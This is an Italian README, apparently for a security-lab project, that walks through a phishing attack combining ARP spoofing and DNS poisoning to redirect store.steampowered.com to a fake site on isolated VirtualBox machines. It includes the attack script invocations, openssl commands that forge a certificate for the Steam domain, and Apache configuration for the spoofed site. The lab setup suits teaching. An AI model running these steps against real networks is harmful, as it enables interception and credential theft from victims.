# Attacco di phishing con DNS poisoning

# Cos'è il DNS poisoning?

L'attacco **DNS poisoning** vuole inserire record fasulli in risposta a query DNS, con lo scopo di ingannare la vittima. Con il **phishing** si vuole portare la vittima ad un sito web fasullo, all'apparenza identico all'originale. L'attacco prevede che l'url associato al sito web presenti il dominio originale, non destando sospetti agli occhi della vittima.

# Utilizzo

## ARP spoofing
Il primo step prevede di realizzare un attacco MITM (Man in the middle) grazie all'ARP spoofing, tramite il comando:
~~~console
$ sudo python3 arp_spoofing.py -s DNS_SERVER_IP -t TARGET_IP
~~~

~~~console
usage: arp_poisoning.py [-h] [-s SERVER] [-t TARGET]

options:
- `-h`, `--help`: Show this help message and exit
- `-s SERVER`, `--server SERVER`: IP address of the gateway/DNS server
- `-t TARGET`, `--target TARGET`: IP address of the target
~~~


Verranno mandati pacchetti ARP alle due macchine indicate tra i parametri del comando. Dopo l'attacco:
- il *server DNS* manderà all'attaccante il traffico verso il *target*; 
- il *target* manderà all'attaccante il traffico verso il *server DNS*.

## DNS poisoning
Il secondo step prevede di modificare solo i pacchetti di tipo DNS Resource Record (DNS reply) verso *store.steampowered.com.* indirizzando il traffico verso l'indirizzo IP indicato.
~~~console
$ sudo python3 dns_poisoning.py -i ATTACKER_IP
~~~

~~~console
usage: dns_poisoning.py [-h] [-i IP]

options:
- `-h`, `--help`: Show this help message and exit
- `-i IP`, `--ip`: IP address to spoof
~~~

Dopo l'attacco, in seguito alla ricezione di un pacchetto DNS reply:
- se il pacchetto presenta nella qname *store.steampowered.com.*, nella risposta l'IP effettivo viene sostituito dall' *ATTACKER_IP* indicato; 
- altrimenti viene fatto il redirect senza modifiche.

# Steps per ricreare l'attacco

## Setup Virtualbox

C'è bisogno di 4 VM:
- Kali Linux 2023-1 (attaccante)        192.168.56.102
- Ubuntu Server 22.04 (server Steam)    192.168.56.103
- Windows VM (vittima)                  192.168.56.104
- Ubuntu Server 22.04 (server DNS)      192.168.56.106

Le macchine devono essere in modalità network host-only con gli indirizzi IP statici indicati.

## Setup BIND

Il server DNS deve installare bind9 e ricopiare la configurazione riportata nella cartella *bind*. Per l'installazione seguire le istruzioni in questo link: https://www.digitalocean.com/community/tutorials/how-to-configure-bind-as-a-private-network-dns-server-on-ubuntu-22-04

## Setup Steam DNS

Installare apache2 nella macchina virtuale. Creare certificati con questa serie di comandi:

~~~bash
$ cd /etc/ssl/
$ mkdir steam_certs
$ cd steam_certs/
$ openssl genrsa -des3 -out rootCA.key 4096
$ openssl req -x509 -new -nodes -key rootCA.key -sha256 -days 1024 -out rootCA.crt
$ openssl genrsa -out SERVER.key 2048
$ openssl req -new -sha256 \
    -key SERVER.key \
    -subj "/C=US/ST=Washington/O=ORG/OU=ORG_UNIT/CN=store.steampowered.com" \
    -reqexts SAN \
    -config <(cat /etc/ssl/openssl.cnf <(printf "\n[SAN]\nsubjectAltName=DNS:store.steampowered.com")) \
    -out SERVER.csr
$ openssl x509 -req -extfile <(printf "subjectAltName=DNS:store.steampowered.com") -days 120 -in SERVER.csr -CA rootCA.crt -CAkey rootCA.key -CAcreateserial -out SERVER.crt -sha256
~~~

Modificare il file in /etc/apache2/sites-available
~~~bash
$ cd /etc/apache2/sites-available/
$ mv 000-default.conf store.steampowered.com.conf
$ nano store.steampowered.com.conf
~~~

~~~bash
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        Redirect / https://store.steampowered.com/
</VirtualHost>

<VirtualHost *:80>
        ServerName store.steampowered.com
        Redirect / https://store.steampowered.com/
</VirtualHost>

<VirtualHost *:443>
   ServerName store.steampowered.com
   DocumentRoot /var/www/html

   SSLEngine on
   SSLCertificateFile /etc/ssl/steam_certs/SERVER.crt
   SSLCertificateKeyFile /etc/ssl/steam_certs/SERVER.key
</VirtualHost>
~~~

Abilita il file di configurazione
~~~bash
sudo a2ensite store.steampowered.com.conf
~~~

Copiare la cartella fake_website come /var/www/html

Reload di apache2
~~~bash
sudo systemctl reload apache2
~~~

## Setup Webserver Kali

Per kali è stato scelto il dominio *www.cybersec.local* come dominio locale, la differenza con Steam è che il redirect a https non è previsto e che il certificato prevede sia www.cybersec.local che store.steampowered.com come alternate name.

~~~bash
sudo nano /etc/hosts
~~~

~~~bash
127.0.0.1       localhost
127.0.1.1       kali
127.0.0.1       www.cybersec.local
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
~~~

Seguire la stessa procedura per la generazione dei certificati, questa volta salvati in /etc/ssl/cybersec_certs, modificando i domini accettati:
~~~bash
$ openssl req -new -sha256 \
    -key SERVER.key \
    -subj "/C=US/ST=Washington/O=ORG/OU=ORG_UNIT/CN=store.steampowered.com" \
    -reqexts SAN \
    -config <(cat /etc/ssl/openssl.cnf <(printf "\n[SAN]\nsubjectAltName=DNS:store.steampowered.com;DNS:www.cybersec.local")) \
    -out SERVER.csr
$ openssl x509 -req -extfile <(printf "subjectAltName=DNS:store.steampowered.com;DNS:www.cybersec.local") -days 120 -in SERVER.csr -CA rootCA.crt -CAkey rootCA.key -CAcreateserial -out SERVER.crt -sha256
~~~
Modificare il file in /etc/apache2/sites-available
~~~bash
$ cd /etc/apache2/sites-available/
$ mv 000-default.conf www.cybersec.local.conf
$ nano www.cybersec.local.conf
~~~
~~~bash
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/cybersec
</VirtualHost>

<VirtualHost *:80>
        ServerName www.cybersec.local
        DocumentRoot /var/www/cybersec
</VirtualHost>

<VirtualHost *:443>
   ServerName www.cybersec.local
   DocumentRoot /var/www/cybersec

   SSLEngine on
   SSLCertificateFile /etc/ssl/cybersec_certs/SERVER.crt
   SSLCertificateKeyFile /etc/ssl/cybersec_certs/SERVER.key
</VirtualHost>
~~~

Copiare la cartella fake_website come /var/www/cybersec

Reload di apache2
~~~bash
sudo systemctl reload apache2
~~~

## Eseguire gli script

Copiare e far partire gli script da Kali:

~~~bash
$ python3 arp_spoofing.py -s 192.168.56.106 -t 192.168.56.104
$ python3 dns_poisoning.py -i 192.168.56.102
~~~

## Testing

Accedere a *store.steampowered.com* dalla macchina Windows.

